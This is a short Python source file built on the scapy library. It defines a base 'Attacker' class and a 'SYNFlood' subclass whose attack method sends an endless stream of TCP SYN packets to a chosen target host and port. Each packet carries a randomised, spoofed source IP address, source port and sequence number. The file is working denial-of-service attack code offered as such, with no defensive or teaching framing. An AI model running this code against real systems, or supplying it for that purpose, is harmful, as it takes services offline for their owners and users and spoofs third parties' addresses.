from scapy.all import *
from ipaddress import IPv4Address
from random import getrandbits

class _Attacker:
    """
    Base Attacker object to inherit from.
    """
    __attacker__ = "Base Attacker"

    def __init__(self, target, port):
        self._target = target
        self._port = port


    def set_target(self, new_target, new_port):
        self._target = new_target
        self._port = new_port

    def attack(self):
        raise NotImplementedError()
        


class SYNFlood(_Attacker):
    """
    SYN Flooding Attacker.
    """
    __attacker__ = "SYN Flooding Attacker"
    
    def attack(self):
        ip  = IP(dst=self._target)
        tcp = TCP(dport=self._port, flags='S')
        pkt = ip/tcp

        while True:
            pkt[IP].src    = str(IPv4Address(getrandbits(32)))  # source iP
            pkt[TCP].sport = getrandbits(16)     # source port
            pkt[TCP].seq   = getrandbits(32)     # sequence number
            send(pkt, verbose = 0)

